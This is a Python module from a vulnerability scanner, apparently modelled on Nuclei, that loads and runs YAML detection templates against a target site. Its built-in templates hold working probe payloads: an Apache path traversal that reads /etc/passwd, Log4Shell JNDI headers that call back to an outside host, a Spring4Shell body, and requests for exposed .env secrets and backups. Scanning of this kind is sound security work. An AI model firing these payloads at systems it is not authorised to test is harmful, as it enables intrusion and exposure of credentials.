"""
cyberm4fia-scanner - Enhanced Nuclei-Style Template Engine
Production-grade YAML template scanner with multi-step, extractors,
variable interpolation, and severity/tag filtering.
"""

import os
import re
import json
import yaml
from urllib.parse import urlparse, urljoin

from utils.colors import log_info, log_success, log_warning, log_vuln
from utils.request import increment_vulnerability_count, smart_request
from utils.request import ScanExceptions

TEMPLATE_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "templates"
)


def ensure_template_dir():
    if not os.path.exists(TEMPLATE_DIR):
        os.makedirs(TEMPLATE_DIR)
        _create_builtin_templates()


def _create_builtin_templates():
    """Create built-in vulnerability templates."""
    templates = _get_builtin_templates()
    for tpl in templates:
        filepath = os.path.join(TEMPLATE_DIR, f"{tpl['id']}.yaml")
        with open(filepath, "w") as f:
            yaml.dump(tpl, f, default_flow_style=False)


def _get_builtin_templates():
    """Return 10+ built-in vulnerability templates."""
    return [
        {
            "id": "cve-2021-41773",
            "info": {
                "name": "Apache 2.4.49 - Path Traversal (CVE-2021-41773)",
                "author": "cyberm4fia",
                "severity": "critical",
                "tags": ["cve", "apache", "lfi", "rce"],
                "description": "Path traversal and file disclosure in Apache HTTP Server 2.4.49.",
            },
            "requests": [{
                "method": "GET",
                "path": ["/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd"],
                "matchers": [
                    {"type": "word", "words": ["root:x:0:0:root"]},
                    {"type": "status", "status": [200]},
                ],
            }],
        },
        {
            "id": "cve-2021-44228",
            "info": {
                "name": "Log4Shell RCE (CVE-2021-44228)",
                "author": "cyberm4fia",
                "severity": "critical",
                "tags": ["cve", "log4j", "rce", "jndi"],
                "description": "Apache Log4j2 Remote Code Execution.",
            },
            "requests": [{
                "method": "GET",
                "path": ["/"],
                "headers": {
                    "X-Api-Version": "${jndi:ldap://{{interactsh-url}}/log4j}",
                    "User-Agent": "${jndi:ldap://{{interactsh-url}}/log4j}",
                },
                "matchers": [
                    {"type": "word", "part": "interactsh_protocol", "words": ["dns", "http"]},
                ],
            }],
        },
        {
            "id": "cve-2022-22965",
            "info": {
                "name": "Spring4Shell RCE (CVE-2022-22965)",
                "author": "cyberm4fia",
                "severity": "critical",
                "tags": ["cve", "spring", "rce"],
                "description": "Spring Framework RCE via Data Binding on JDK 9+.",
            },
            "requests": [{
                "method": "POST",
                "path": ["/"],
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "class.module.classLoader.DefaultAssertionStatus=true",
                "matchers": [{"type": "status", "status": [200]}],
            }],
        },
        {
            "id": "cve-2023-22515",
            "info": {
                "name": "Atlassian Confluence - Broken Access Control (CVE-2023-22515)",
                "author": "cyberm4fia",
                "severity": "critical",
                "tags": ["cve", "confluence", "auth-bypass"],
                "description": "Privilege escalation in Confluence Data Center and Server.",
            },
            "requests": [{
                "method": "GET",
                "path": ["/server-info.action"],
                "matchers": [
                    {"type": "word", "words": ["Server Information"]},
                    {"type": "status", "status": [200]},
                ],
            }],
        },
        {
            "id": "cve-2023-46747",
            "info": {
                "name": "F5 BIG-IP - Authentication Bypass (CVE-2023-46747)",
                "author": "cyberm4fia",
                "severity": "critical",
                "tags": ["cve", "f5", "bigip", "auth-bypass"],
                "description": "Unauthenticated RCE via request smuggling in F5 BIG-IP.",
            },
            "requests": [{
                "method": "GET",
                "path": ["/tmui/login.jsp"],
                "matchers": [
                    {"type": "word", "words": ["BIG-IP", "F5 Networks"]},
                    {"type": "status", "status": [200]},
                ],
            }],
        },
        {
            "id": "exposed-git-config",
            "info": {
                "name": "Exposed .git/config",
                "author": "cyberm4fia",
                "severity": "medium",
                "tags": ["exposure", "git", "config"],
                "description": "Git repository configuration file is publicly accessible.",
            },
            "requests": [{
                "method": "GET",
                "path": ["/.git/config"],
                "matchers": [
                    {"type": "word", "words": ["[core]", "[remote"]},
                    {"type": "status", "status": [200]},
                ],
            }],
        },
        {
            "id": "exposed-env-file",
            "info": {
                "name": "Exposed .env File",
                "author": "cyberm4fia",
                "severity": "high",
                "tags": ["exposure", "env", "credentials"],
                "description": "Environment file with credentials is publicly accessible.",
            },
            "requests": [{
                "method": "GET",
                "path": ["/.env"],
                "matchers": [
                    {"type": "regex", "regex": ["(DB_PASSWORD|APP_KEY|SECRET_KEY|AWS_SECRET)\\s*="]},
                    {"type": "status", "status": [200]},
                ],
            }],
        },
        {
            "id": "exposed-phpinfo",
            "info": {
                "name": "Exposed phpinfo()",
                "author": "cyberm4fia",
                "severity": "low",
                "tags": ["exposure", "php", "info"],
                "description": "PHP info page is publicly accessible.",
            },
            "requests": [{
                "method": "GET",
                "path": ["/phpinfo.php", "/info.php", "/php_info.php"],
                "matchers": [
                    {"type": "word", "words": ["PHP Version", "phpinfo()"]},
                    {"type": "status", "status": [200]},
                ],
            }],
        },
        {
            "id": "exposed-debug-endpoints",
            "info": {
                "name": "Exposed Debug/Admin Endpoints",
                "author": "cyberm4fia",
                "severity": "high",
                "tags": ["exposure", "debug", "admin"],
                "description": "Debug or admin endpoints are publicly accessible.",
            },
            "requests": [{
                "method": "GET",
                "path": [
                    "/actuator/health", "/actuator/env", "/_debug",
                    "/elmah.axd", "/trace", "/api/debug",
                ],
                "matchers": [
                    {"type": "word", "words": ['"status"', "actuator", "debug", "elmah"]},
                    {"type": "status", "status": [200]},
                ],
            }],
        },
        {
            "id": "wordpress-xmlrpc",
            "info": {
                "name": "WordPress XML-RPC Enabled",
                "author": "cyberm4fia",
                "severity": "medium",
                "tags": ["wordpress", "xmlrpc", "bruteforce"],
                "description": "WordPress XML-RPC interface is enabled, allowing brute-force attacks.",
            },
            "requests": [{
                "method": "POST",
                "path": ["/xmlrpc.php"],
                "headers": {"Content-Type": "text/xml"},
                "body": "<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName></methodCall>",
                "matchers": [
                    {"type": "word", "words": ["methodResponse", "system.multicall"]},
                    {"type": "status", "status": [200]},
                ],
            }],
        },
        {
            "id": "server-status-exposed",
            "info": {
                "name": "Apache Server-Status Exposed",
                "author": "cyberm4fia",
                "severity": "medium",
                "tags": ["exposure", "apache", "status"],
                "description": "Apache server-status page is publicly accessible.",
            },
            "requests": [{
                "method": "GET",
                "path": ["/server-status", "/server-info"],
                "matchers": [
                    {"type": "word", "words": ["Apache Server Status", "Server Version"]},
                    {"type": "status", "status": [200]},
                ],
            }],
        },
        {
            "id": "backup-files",
            "info": {
                "name": "Backup Files Detected",
                "author": "cyberm4fia",
                "severity": "medium",
                "tags": ["exposure", "backup"],
                "description": "Backup files are publicly accessible.",
            },
            "requests": [{
                "method": "GET",
                "path": [
                    "/backup.sql", "/backup.zip", "/db.sql", "/dump.sql",
                    "/database.sql.gz", "/site.tar.gz",
                ],
                "matchers": [
                    {"type": "status", "status": [200]},
                    {"type": "word", "part": "header", "words": [
                        "application/zip", "application/gzip", "application/sql",
                        "application/octet-stream"
                    ]},
                ],
            }],
        },
    ]


# ── Variable Interpolation ───────────────────────────────────────────────

def _interpolate(text, variables):
    """Replace {{var}} placeholders with actual values."""
    if not isinstance(text, str):
        return text
    for key, val in variables.items():
        text = text.replace(f"{{{{{key}}}}}", str(val))
    return text


def _interpolate_dict(d, variables):
    """Recursively interpolate variables in a dict."""
    result = {}
    for k, v in d.items():
        if isinstance(v, str):
            result[k] = _interpolate(v, variables)
        elif isinstance(v, dict):
            result[k] = _interpolate_dict(v, variables)
        elif isinstance(v, list):
            result[k] = [_interpolate(item, variables) if isinstance(item, str) else item for item in v]
        else:
            result[k] = v
    return result


# ── Extractors ───────────────────────────────────────────────────────────

def _run_extractors(resp, extractors):
    """Extract values from response using extractor definitions."""
    extracted = {}
    for ext in extractors:
        ext_type = ext.get("type", "")
        name = ext.get("name", f"extract_{len(extracted)}")
        part = ext.get("part", "body")

        target_text = (
            resp.text if part == "body"
            else "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
        )

        if ext_type == "regex":
            for pattern in ext.get("regex", []):
                match = re.search(pattern, target_text)
                if match:
                    # Use first group if available, otherwise full match
                    extracted[name] = match.group(1) if match.groups() else match.group(0)
                    break

        elif ext_type == "json":
            try:
                data = resp.json()
                for jq_path in ext.get("json", []):
                    # Simple dot-path extraction (e.g., "data.token")
                    value = data
                    for key in jq_path.split("."):
                        if isinstance(value, dict):
                            value = value.get(key)
                        elif isinstance(value, list) and key.isdigit():
                            value = value[int(key)]
                        else:
                            value = None
                            break
                    if value is not None:
                        extracted[name] = str(value)
                        break
            except (json.JSONDecodeError, ScanExceptions):
                pass

        elif ext_type == "kval":
            # Key-value extraction from headers
            for key in ext.get("kval", []):
                val = resp.headers.get(key)
                if val:
                    extracted[name] = val
                    break

    return extracted


# ── Matchers ─────────────────────────────────────────────────────────────

def _match_response(resp, matchers, condition="and"):
    """Evaluate response against matchers with AND/OR logic."""
    if not matchers:
        return True

    results = []
    for matcher in matchers:
        results.append(_evaluate_matcher(resp, matcher))

    if condition == "or":
        return any(results)
    return all(results)  # Default AND


def _evaluate_matcher(resp, matcher):
    """Evaluate a single matcher against a response."""
    m_type = matcher.get("type", "")
    negative = matcher.get("negative", False)

    if m_type == "word":
        words = matcher.get("words", [])
        part = matcher.get("part", "body")
        target_text = _get_part(resp, part)

        matched = any(w.lower() in target_text.lower() for w in words)
        return not matched if negative else matched

    elif m_type == "status":
        statuses = matcher.get("status", [])
        matched = resp.status_code in statuses
        return not matched if negative else matched

    elif m_type == "regex":
        regexes = matcher.get("regex", [])
        part = matcher.get("part", "body")
        target_text = _get_part(resp, part)

        matched = any(re.search(r, target_text, re.IGNORECASE) for r in regexes)
        return not matched if negative else matched

    elif m_type == "size":
        sizes = matcher.get("size", [])
        part = matcher.get("part", "body")
        target_text = _get_part(resp, part)

        matched = len(target_text) in sizes
        return not matched if negative else matched

    elif m_type == "dsl":
        # Simple DSL expressions
        expressions = matcher.get("dsl", [])
        matched = _evaluate_dsl(resp, expressions)
        return not matched if negative else matched

    return False


def _get_part(resp, part):
    """Get the specified part of the response."""
    if part == "header":
        return "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
    elif part == "status_code":
        return str(resp.status_code)
    elif part == "all":
        headers = "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
        return f"{headers}\n\n{resp.text}"
    return resp.text  # Default: body


def _evaluate_dsl(resp, expressions):
    """Evaluate simple DSL expressions."""
    for expr in expressions:
        if "status_code" in expr:
            # e.g., "status_code == 200"
            if "==" in expr:
                _, val = expr.split("==")
                if resp.status_code != int(val.strip()):
                    return False
        elif "content_length" in expr:
            if ">" in expr and "==" not in expr:
                _, val = expr.split(">")
                if len(resp.text) <= int(val.strip()):
                    return False
    return True


# ── Template Validation ──────────────────────────────────────────────────

def validate_template(tpl):
    """Validate a template structure. Returns (is_valid, errors)."""
    errors = []

    if not isinstance(tpl, dict):
        return False, ["Template is not a dictionary"]

    if "id" not in tpl:
        errors.append("Missing 'id' field")

    if "info" not in tpl:
        errors.append("Missing 'info' field")
    else:
        info = tpl["info"]
        if "name" not in info:
            errors.append("Missing 'info.name'")
        if "severity" not in info:
            errors.append("Missing 'info.severity'")
        elif info["severity"] not in ["info", "low", "medium", "high", "critical"]:
            errors.append(f"Invalid severity: {info['severity']}")

    if "requests" not in tpl:
        errors.append("Missing 'requests' field")
    elif not isinstance(tpl["requests"], list):
        errors.append("'requests' must be a list")
    else:
        for i, req in enumerate(tpl["requests"]):
            if "matchers" not in req:
                errors.append(f"Request {i}: missing 'matchers'")

    return len(errors) == 0, errors


# ── Template Loading ─────────────────────────────────────────────────────

def load_templates(severity_filter=None, tags_filter=None):
    """
    Load templates with optional filtering.
    
    Args:
        severity_filter: List of severities to include (e.g., ["critical", "high"])
        tags_filter: List of tags to filter by (OR logic)
    """
    ensure_template_dir()
    templates = []

    for root, _, files in os.walk(TEMPLATE_DIR):
        for file in files:
            if file.endswith((".yaml", ".yml")):
                try:
                    with open(os.path.join(root, file), "r") as f:
                        tpl = yaml.safe_load(f)
                        if not tpl or "id" not in tpl:
                            continue

                        # Severity filter
                        if severity_filter:
                            sev = tpl.get("info", {}).get("severity", "info").lower()
                            if sev not in [s.lower() for s in severity_filter]:
                                continue

                        # Tags filter
                        if tags_filter:
                            tpl_tags = tpl.get("info", {}).get("tags", [])
                            if not any(t in tpl_tags for t in tags_filter):
                                continue

                        templates.append(tpl)
                except ScanExceptions as e:
                    log_warning(f"Error loading template {file}: {e}")

    return templates


# ── Main Template Runner ─────────────────────────────────────────────────

def run_templates(url, delay=0, severity_filter=None, tags_filter=None):
    """
    Run YAML templates against the target URL.
    
    Supports:
    - Multi-step requests with data extraction
    - Variable interpolation ({{BaseURL}}, {{Hostname}}, etc.)
    - Extractors (regex, json, kval)
    - AND/OR matcher conditions
    - Severity/tag filtering
    """
    templates = load_templates(severity_filter=severity_filter, tags_filter=tags_filter)
    if not templates:
        return []

    log_info(f"Running {len(templates)} YAML templates against {url}")
    parsed = urlparse(url)

    # Built-in variables
    base_vars = {
        "BaseURL": f"{parsed.scheme}://{parsed.netloc}",
        "RootURL": f"{parsed.scheme}://{parsed.netloc}",
        "Hostname": parsed.hostname or "",
        "Host": parsed.netloc,
        "Port": str(parsed.port or (443 if parsed.scheme == "https" else 80)),
        "Schema": parsed.scheme,
        "Scheme": parsed.scheme,
    }

    vulns = []

    for tpl in templates:
        tid = tpl.get("id")
        name = tpl.get("info", {}).get("name", "Unknown vulnerability")
        severity = tpl.get("info", {}).get("severity", "info").upper()
        tags = tpl.get("info", {}).get("tags", [])

        # Per-template variable context (accumulates across steps)
        variables = dict(base_vars)

        all_matched = True

        for req_idx, req in enumerate(tpl.get("requests", [])):
            method = req.get("method", "GET").lower()
            paths = req.get("path", ["/"])
            headers = _interpolate_dict(req.get("headers", {}), variables)
            body = _interpolate(req.get("body"), variables) if req.get("body") else None
            matchers = req.get("matchers", [])
            matcher_condition = req.get("matchers-condition", "and")
            extractors = req.get("extractors", [])

            step_matched = False

            for path in paths:
                # Interpolate path
                path = _interpolate(path, variables)
                path = path.replace("{{BaseURL}}", "")
                if not path.startswith("/"):
                    path = "/" + path

                target = urljoin(f"{parsed.scheme}://{parsed.netloc}", path)

                try:
                    resp = smart_request(
                        method, target,
                        headers=headers,
                        data=body,
                        delay=delay,
                        allow_redirects=False,
                    )

                    # Run extractors first (they add to variables for next steps)
                    if extractors and resp:
                        extracted = _run_extractors(resp, extractors)
                        variables.update(extracted)

                    # Check matchers
                    if _match_response(resp, matchers, condition=matcher_condition):
                        step_matched = True
                        break  # First matching path wins

                except ScanExceptions:
                    pass

            if not step_matched:
                all_matched = False
                break  # If any step fails, whole template fails

        if all_matched and tpl.get("requests"):
            increment_vulnerability_count()
            log_vuln(f"TEMPLATE MATCH! [{tid}] - {name} ({severity})")
            log_success(f"Target: {url}")

            vulns.append({
                "type": "Template",
                "id": tid,
                "name": name,
                "severity": severity,
                "url": url,
                "method": method.upper(),
                "tags": tags,
                "extracted": {k: v for k, v in variables.items() if k not in base_vars},
            })

    return vulns
